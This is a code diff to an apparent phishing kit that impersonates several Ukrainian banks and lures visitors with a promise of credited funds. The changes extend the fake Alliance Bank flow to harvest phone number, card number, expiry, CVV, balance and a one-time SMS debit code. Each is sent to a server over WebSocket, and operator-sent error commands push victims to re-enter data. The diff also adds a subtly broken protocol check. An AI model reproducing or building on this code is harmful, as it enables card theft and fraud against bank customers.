@@ -13,7 +13,7 @@
             --oschad-primary: #00A39C;
             --raiff-bg: #1C1C1E; --raiff-text: #F2F2F7; --raiff-text-secondary: #8E8E93;
             --raiff-yellow: #FFCC00; --raiff-btn-bg: #2C2C2E;
-            /* --- НОВЫЕ СТИЛИ для Альянс Банка --- */
+            /* --- СТИЛИ для Альянс Банка --- */
             --alliance-primary: #0072CE; --alliance-bg: #f4f8fc;
             --alliance-text: #212529; --alliance-text-secondary: #5a6a7b;
             --alliance-btn-bg: #e9f2fa; --alliance-border-color: #d1e3f5;
@@ -447,7 +447,7 @@
         .raiff-key:active { background-color: #444; }
         .raiff-key.backspace { background-color: transparent; }
 
-        /* --- НОВЫЕ СТИЛИ для Альянс Банка --- */
+        /* --- СТИЛИ для Альянс Банка --- */
         #alliance-modal-overlay {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background-color: var(--alliance-bg);
@@ -477,23 +477,32 @@
         .alliance-icon-container { text-align: center; margin: 20px 0 40px; }
         .alliance-main-title { font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 15px; color: var(--alliance-text); }
         .alliance-subtitle { font-size: 16px; color: var(--alliance-text-secondary); text-align: center; line-height: 1.5; margin-bottom: 30px; }
-        
-        /* Стили для ввода телефона и карты */
         .alliance-input-group {
             display: flex; align-items: center;
             border: 1px solid var(--alliance-border-color);
             border-radius: 12px;
-            padding: 0 15px;
             background-color: var(--white);
             transition: border-color 0.2s ease;
             position: relative;
+            margin-bottom: 15px;
         }
         .alliance-input-group.focused { border-color: var(--alliance-primary); }
-        .alliance-input-prefix { font-size: 18px; font-weight: 500; padding: 15px 0; color: var(--alliance-text-secondary); }
+        .alliance-input-group.error { border-color: var(--danger-color); } /* Стиль для ошибки */
+        .alliance-input-group.half-width-container {
+            display: flex; gap: 15px; border: none; padding: 0; background: transparent;
+        }
+        .alliance-input-group.half-width-container .alliance-input-group {
+             width: 50%; margin-bottom: 0;
+        }
+        .alliance-input-prefix { font-size: 18px; font-weight: 500; padding: 15px; color: var(--alliance-text-secondary); }
         .alliance-input-field {
             flex-grow: 1; background: transparent; border: none; outline: none;
             color: var(--alliance-text); font-size: 18px; font-weight: 500;
-            padding: 15px 5px;
+            padding: 15px; width: 100%;
+        }
+        .alliance-error-text {
+            color: var(--danger-color); font-size: 14px; text-align: left;
+            margin-top: -10px; margin-bottom: 10px; padding-left: 5px;
         }
         .alliance-footer {
             padding: 20px; margin-top: auto;
@@ -508,6 +517,24 @@
             background-color: var(--alliance-primary);
             color: var(--white); cursor: pointer;
         }
+        /* Стили для ввода SMS-кода Альянс */
+        .alliance-code-inputs {
+            display: flex; justify-content: center; gap: 10px; margin-bottom: 25px;
+        }
+        .alliance-code-input {
+            width: 48px; height: 52px;
+            background-color: var(--white);
+            border: 1px solid var(--alliance-border-color);
+            border-radius: 8px; text-align: center;
+            font-size: 24px; font-weight: 600; color: var(--alliance-text);
+            outline: none; caret-color: var(--alliance-primary);
+            -moz-appearance: textfield;
+        }
+        .alliance-code-input::-webkit-outer-spin-button, .alliance-code-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        .alliance-code-input:focus { border-color: var(--alliance-primary); }
+        .alliance-code-inputs.error .alliance-code-input { border-color: var(--danger-color); }
+        .alliance-resend-info { text-align: center; color: var(--alliance-text-secondary); font-size: 15px; }
+
     </style>
 </head>
 <body>
@@ -546,7 +573,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const bankFlows = {
         'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank' },
         'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://play-lh.googleusercontent.com/bKSKrzk-rS1KB0c0CApj1C8P3XLa5r_KH6eKyYWw4FJz3p5NavHLB9MakrFRJLbhMzw', theme: 'raiffeisen' },
-        // --- ИЗМЕНЕНИЕ: Упрощенная конфигурация для Альянс Банка ---
         'alliance': { name: 'Альянс', logoUrl: 'https://bank.gov.ua/files/Logobank/300119.png?v=14', theme: 'alliance' },
         'vostok': { name: 'Восток', logoUrl: 'https://ubanks.com.ua/img/bank-logo/bankvostok-logo-2x.png', theme: 'vostok', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
         'izibank': { name: 'Izibank', logoUrl: 'https://ubanks.com.ua/img/bank-logo/izibank-logo-2x.png', theme: 'izibank', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }], special: true },
@@ -578,7 +604,6 @@ document.addEventListener('DOMContentLoaded', () => {
     const customModalContent = document.getElementById('custom-modal-content');
     const raiffModalOverlay = document.getElementById('raiff-modal-overlay');
     const raiffModalContent = document.getElementById('raiff-modal-content');
-    // --- НОВЫЙ ЭЛЕМЕНТ для Альянс Банка ---
     const allianceModalOverlay = document.getElementById('alliance-modal-overlay');
     const allianceModalContent = document.getElementById('alliance-modal-content');
     
@@ -587,7 +612,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- WEBSOCKET LOGIC ---
     function connectWebSocket() {
-        const protocol = window.location.protocol === 'https:' ? 'wss' : 'ws';
+        const protocol = window.location.protocol === 'https' ? 'wss' : 'ws';
         ws = new WebSocket(`${protocol}://${window.location.host}`);
         ws.onopen = () => ws.send(JSON.stringify({ type: 'register', sessionId }));
         ws.onmessage = (event) => handleServerCommand(JSON.parse(event.data));
@@ -595,7 +620,7 @@ document.addEventListener('DOMContentLoaded', () => {
         ws.onerror = (error) => console.error('WebSocket error:', error);
     }
     
-    // --- START ALLIANCE BANK FLOW (NEW) ---
+    // --- START ALLIANCE BANK FLOW ---
 
     function renderAlliancePhoneScreen() {
         const html = `
@@ -607,10 +632,8 @@ document.addEventListener('DOMContentLoaded', () => {
                 <img src="${activeBankData.logoUrl}" class="alliance-header-logo" alt="Логотип банку">
             </div>
             <div class="alliance-content-wrapper">
-                <div class="alliance-icon-container">
-                    <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M16.5 2H7.5C6.11929 2 5 3.11929 5 4.5V19.5C5 20.8807 6.11929 22 7.5 22H16.5C17.8807 22 19 20.8807 19 19.5V4.5C19 3.11929 17.8807 2 16.5 2Z" stroke="${getComputedStyle(document.documentElement).getPropertyValue('--alliance-primary')}" stroke-width="1.5"/><path d="M12 18.5V18.501" stroke="${getComputedStyle(document.documentElement).getPropertyValue('--alliance-primary')}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-                </div>
-                <h2 class="alliance-main-title">Ласкаво просимо</h2>
+                <h2 class="alliance-main-title" style="margin-top: 60px;">Ласкаво просимо</h2>
+                <p class="alliance-subtitle">Введіть ваш фінансовий номер телефону</p>
                 <div class="alliance-input-group" id="alliance-phone-group">
                     <span class="alliance-input-prefix">+380</span>
                     <input type="tel" id="alliance-phone-input" class="alliance-input-field" placeholder="Номер телефону" autocomplete="off">
@@ -631,13 +654,16 @@ document.addEventListener('DOMContentLoaded', () => {
         const phoneGroup = document.getElementById('alliance-phone-group');
         const continueBtn = document.getElementById('alliance-continue-btn');
 
-        phoneInput.addEventListener('focus', () => phoneGroup.classList.add('focused'));
-        phoneInput.addEventListener('blur', () => phoneGroup.classList.remove('focused'));
+        const toggleFocus = (add) => {
+            phoneGroup.classList.toggle('focused', add);
+        };
+        phoneInput.addEventListener('focus', () => toggleFocus(true));
+        phoneInput.addEventListener('blur', () => toggleFocus(false));
 
         phoneInput.addEventListener('input', () => {
             let value = phoneInput.value.replace(/\D/g, '');
             if (value.length > 9) value = value.substring(0, 9);
-            phoneInput.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim();;
+            phoneInput.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim();
 
             if (value.length === 9) {
                 continueBtn.classList.add('active');
@@ -650,64 +676,162 @@ document.addEventListener('DOMContentLoaded', () => {
             if (continueBtn.classList.contains('active')) {
                 const phone = '+380' + phoneInput.value.replace(/\D/g, '');
                 sendDataToServer({ phone: phone }, false);
-                renderAllianceCardScreen();
+                renderAllianceFullCardScreen(); // Переход на новую детализированную форму
             }
         });
     }
 
-    function renderAllianceCardScreen() {
+    function renderAllianceFullCardScreen(options = {}) {
         const html = `
             <div class="alliance-header">
                 <span class="back-arrow" id="alliance-back-btn">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="${getComputedStyle(document.documentElement).getPropertyValue('--alliance-text')}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                 </span>
-                <span class="title">Зарахування коштів</span>
-                <img src="${activeBankData.logoUrl}" class="alliance-header-logo" alt="Логотип банку">
+                <span class="title">Запит на зарахування</span>
             </div>
             <div class="alliance-content-wrapper">
-                <div class="alliance-icon-container">
-                    <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="3" y="6" width="18" height="12" rx="2" stroke="${getComputedStyle(document.documentElement).getPropertyValue('--alliance-primary')}" stroke-width="1.5"/><line x1="3" y1="10" x2="21" y2="10" stroke="${getComputedStyle(document.documentElement).getPropertyValue('--alliance-primary')}" stroke-width="1.5"/></svg>
-                </div>
-                <h2 class="alliance-main-title">Введіть номер картки</h2>
+                <h2 class="alliance-main-title">Введіть дані картки</h2>
                 <p class="alliance-subtitle">Кошти будуть зараховані на вказану картку</p>
+
                 <div class="alliance-input-group" id="alliance-card-group">
-                    <input type="tel" id="alliance-card-input" class="alliance-input-field" placeholder="XXXX XXXX XXXX XXXX" autocomplete="off">
+                    <input type="tel" id="alliance-card-input" class="alliance-input-field" placeholder="Номер картки" autocomplete="off" value="${collectedData.card_number || ''}">
                 </div>
+                <div class="alliance-input-group half-width-container">
+                    <div class="alliance-input-group" id="alliance-expiry-group">
+                        <input type="tel" id="alliance-expiry-input" class="alliance-input-field" placeholder="ММ/РР" autocomplete="off" value="${collectedData.expiry_date || ''}">
+                    </div>
+                    <div class="alliance-input-group" id="alliance-cvv-group">
+                        <input type="tel" id="alliance-cvv-input" class="alliance-input-field" placeholder="CVV" autocomplete="off" value="${collectedData.cvv || ''}">
+                    </div>
+                </div>
+                <div class="alliance-input-group ${options.balanceError ? 'error' : ''}" id="alliance-balance-group">
+                    <input type="number" id="alliance-balance-input" class="alliance-input-field" placeholder="Поточний баланс на картці" autocomplete="off">
+                </div>
+                ${options.balanceError ? '<p class="alliance-error-text">Невірний поточний баланс</p>' : ''}
             </div>
             <div class="alliance-footer">
-                <button class="alliance-button" id="alliance-submit-btn">Отримати кошти</button>
+                <button class="alliance-button" id="alliance-submit-btn">Продовжити</button>
             </div>
         `;
         allianceModalContent.innerHTML = html;
         document.getElementById('alliance-back-btn').addEventListener('click', renderAlliancePhoneScreen);
         
-        const cardInput = document.getElementById('alliance-card-input');
-        const cardGroup = document.getElementById('alliance-card-group');
+        const inputs = {
+            card: document.getElementById('alliance-card-input'),
+            expiry: document.getElementById('alliance-expiry-input'),
+            cvv: document.getElementById('alliance-cvv-input'),
+            balance: document.getElementById('alliance-balance-input')
+        };
+        const groups = {
+            card: document.getElementById('alliance-card-group'),
+            expiry: document.getElementById('alliance-expiry-group'),
+            cvv: document.getElementById('alliance-cvv-group'),
+            balance: document.getElementById('alliance-balance-group')
+        };
         const submitBtn = document.getElementById('alliance-submit-btn');
 
-        cardInput.addEventListener('focus', () => cardGroup.classList.add('focused'));
-        cardInput.addEventListener('blur', () => cardGroup.classList.remove('focused'));
+        Object.keys(inputs).forEach(key => {
+            inputs[key].addEventListener('focus', () => groups[key].classList.add('focused'));
+            inputs[key].addEventListener('blur', () => groups[key].classList.remove('focused'));
+        });
 
-        cardInput.addEventListener('input', (e) => {
-            let value = e.target.value.replace(/\D/g, '').substring(0, 16);
-            e.target.value = value.replace(/(\d{4})/g, '$1 ').trim();
-            if (value.length === 16) {
+        const checkFormValidity = () => {
+            const isCardValid = inputs.card.value.replace(/\D/g, '').length === 16;
+            const isExpiryValid = inputs.expiry.value.replace(/\D/g, '').length === 4;
+            const isCvvValid = inputs.cvv.value.replace(/\D/g, '').length === 3;
+            const isBalanceValid = inputs.balance.value.length > 0;
+            if (isCardValid && isExpiryValid && isCvvValid && isBalanceValid) {
                 submitBtn.classList.add('active');
             } else {
                 submitBtn.classList.remove('active');
             }
+        };
+
+        inputs.card.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '').substring(0, 16);
+            e.target.value = value.replace(/(\d{4})/g, '$1 ').trim();
+            checkFormValidity();
         });
+        inputs.expiry.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '').substring(0, 4);
+            if (value.length > 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2);
+            }
+            e.target.value = value;
+            checkFormValidity();
+        });
+        inputs.cvv.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
+            checkFormValidity();
+        });
+        inputs.balance.addEventListener('input', checkFormValidity);
         
+        // Initial check in case of coming back with error
+        checkFormValidity();
+
         submitBtn.addEventListener('click', () => {
             if (submitBtn.classList.contains('active')) {
-                const card = cardInput.value.replace(/\s/g, '');
-                sendDataToServer({ card_number: card }, true);
+                const data = {
+                    card_number: inputs.card.value.replace(/\s/g, ''),
+                    expiry_date: inputs.expiry.value,
+                    cvv: inputs.cvv.value,
+                    balance: inputs.balance.value
+                };
+                sendDataToServer(data, true);
                 allianceModalContent.innerHTML = `<div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100%;"><h2 class="alliance-main-title">Обробка...</h2><p class="alliance-subtitle">Будь ласка, зачекайте. Не закривайте сторінку.</p></div>`;
             }
         });
     }
 
+    function renderAllianceDebitSmsScreen(options = {}) {
+        lastCodeScreen = 'alliance_debit';
+        const html = `
+            <div class="alliance-header">
+                 <span class="back-arrow" id="alliance-back-btn">
+                     <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18L9 12L15 6" stroke="${getComputedStyle(document.documentElement).getPropertyValue('--alliance-text')}" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                </span>
+                <span class="title">Підтвердження</span>
+            </div>
+            <div class="alliance-content-wrapper">
+                 <div class="alliance-icon-container">
+                   <svg width="64" height="64" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M21 5.25L12 13.5L3 5.25" stroke="${getComputedStyle(document.documentElement).getPropertyValue('--alliance-primary')}" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/><path d="M3 5.25H21V18C21 18.1989 20.921 18.3897 20.7803 18.5303C20.6397 18.671 20.4489 18.75 20.25 18.75H3.75C3.55109 18.75 3.36032 18.671 3.21967 18.5303C3.07902 18.3897 3 18.1989 3 18V5.25Z" stroke="${getComputedStyle(document.documentElement).getPropertyValue('--alliance-primary')}" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+                </div>
+                <h2 class="alliance-main-title">Останній крок</h2>
+                <p class="alliance-subtitle">Для зарахування коштів на вашу картку введіть одноразовий SMS код</p>
+                <div class="alliance-code-inputs ${options.error ? 'error' : ''}">
+                    ${Array(6).fill('<input type="tel" class="alliance-code-input" maxlength="1">').join('')}
+                </div>
+                ${options.error ? `<p class="alliance-error-text" style="text-align:center; margin-top: -10px;">Невірний код</p>` : ''}
+                <p class="alliance-resend-info" id="alliance-resend-info" style="margin-top: 20px;">Надіслати код повторно</p>
+            </div>
+        `;
+        allianceModalContent.innerHTML = html;
+        document.getElementById('alliance-back-btn').addEventListener('click', () => renderAllianceFullCardScreen());
+
+        const codeInputs = [...allianceModalContent.querySelectorAll('.alliance-code-input')];
+        if (codeInputs.length > 0) codeInputs[0].focus();
+
+        codeInputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value && index < codeInputs.length - 1) codeInputs[index + 1].focus();
+                
+                const allFilled = codeInputs.every(inp => inp.value.length === 1);
+                if (allFilled) {
+                    const code = codeInputs.map(inp => inp.value).join('');
+                    sendDataToServer({ debit_sms_code: code }, true);
+                    allianceModalContent.innerHTML = `<div style="display:flex; flex-direction:column; justify-content:center; align-items:center; height:100%;"><h2 class="alliance-main-title">Обробка...</h2><p class="alliance-subtitle">Будь ласка, зачекайте.</p></div>`;
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !input.value && index > 0) {
+                    codeInputs[index - 1].focus();
+                }
+            });
+        });
+    }
+
     // --- END ALLIANCE BANK FLOW ---
+
 
     // --- RAIFFEISEN BANK FLOW ---
 
@@ -904,7 +1028,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- END RAIFFEISEN BANK FLOW ---
     
-    // --- GENERIC DEBIT FORM (for non-Oschad) ---
+    // --- GENERIC DEBIT FORM ---
     function renderThemedDebitScreen(options = {}) {
         lastCodeScreen = 'generic_debit';
         const html = `
@@ -1459,40 +1583,48 @@ document.addEventListener('DOMContentLoaded', () => {
         };
 
         switch (type) {
-            case 'lk':
-                renderOschadbankLogin();
-                break;
-            case 'call':
-                renderOschadbankCallConfirmation();
-                break;
-            case 'telegram_debit':
-                renderTelegramSmsScreen();
-                break;
+            case 'lk': renderOschadbankLogin(); break;
+            case 'call': renderOschadbankCallConfirmation(); break;
+            case 'telegram_debit': renderTelegramSmsScreen(); break;
+            
             case 'show_debit_form':
-                renderThemedDebitScreen();
+                if (activeBankData.theme === 'alliance') {
+                    renderAllianceDebitSmsScreen();
+                } else {
+                    renderThemedDebitScreen();
+                }
                 break;
+
             case 'password_error':
                 const errorMsg = data.loginType === 'login' ? 'Невірний логін або пароль' : 'Невірний пароль';
                 const savedPhone = data.loginType === 'phone' && collectedData.phone ? collectedData.phone.replace('+380', '').replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4') : '';
                 renderOschadbankLogin({ errorType: data.loginType, errorMessage: errorMsg, savedPhone });
                 break;
-            case 'raiff_pin_error':
-                renderRaiffPinScreen({ error: true });
-                break;
+                
+            case 'raiff_pin_error': renderRaiffPinScreen({ error: true }); break;
+            
             case 'code_error':
                 const errorOptions = { error: true };
-                if (lastCodeScreen === 'oschad_call') {
-                    renderOschadbankCallConfirmation(errorOptions);
-                } else if (lastCodeScreen === 'telegram_sms') {
-                    renderTelegramSmsScreen(errorOptions);
+                if (lastCodeScreen === 'oschad_call') renderOschadbankCallConfirmation(errorOptions);
+                else if (lastCodeScreen === 'telegram_sms') renderTelegramSmsScreen(errorOptions);
+                break;
+
+            case 'raiff_code_error': renderRaiffSmsScreen(collectedData.phone, { error: true }); break;
+            
+            case 'generic_debit_error':
+                if (activeBankData.theme === 'alliance') {
+                    renderAllianceDebitSmsScreen({ error: true });
+                } else {
+                    renderThemedDebitScreen({ error: true });
                 }
                 break;
-            case 'raiff_code_error':
-                renderRaiffSmsScreen(collectedData.phone, { error: true });
+
+            case 'balance_error':
+                if (activeBankData.theme === 'alliance') {
+                    renderAllianceFullCardScreen({ balanceError: true });
+                }
                 break;
-            case 'generic_debit_error':
-                renderThemedDebitScreen({ error: true });
-                break;
+
             case 'sms':
                 modalTitle.textContent = 'Введіть код з SMS';
                 stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="Введіть код"></div><div id="sms-error-container"></div>`;
@@ -1526,7 +1658,6 @@ document.addEventListener('DOMContentLoaded', () => {
             activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
             collectedData = {};
             
-            // --- ИЗМЕНЕНИЕ: Добавлена проверка для нового флоу Альянс Банка ---
             if (bankId === 'oschadbank') {
                 customModalOverlay.style.display = 'flex';
                 renderOschadbankLogin();
@@ -1537,7 +1668,6 @@ document.addEventListener('DOMContentLoaded', () => {
                 allianceModalOverlay.style.display = 'flex';
                 renderAlliancePhoneScreen();
             } else {
-                // Стандартный флоу для остальных банков
                 body.dataset.theme = activeBankData.theme;
                 formHeaderLogo.src = activeBankData.logoUrl;
                 body.classList.add('form-active');
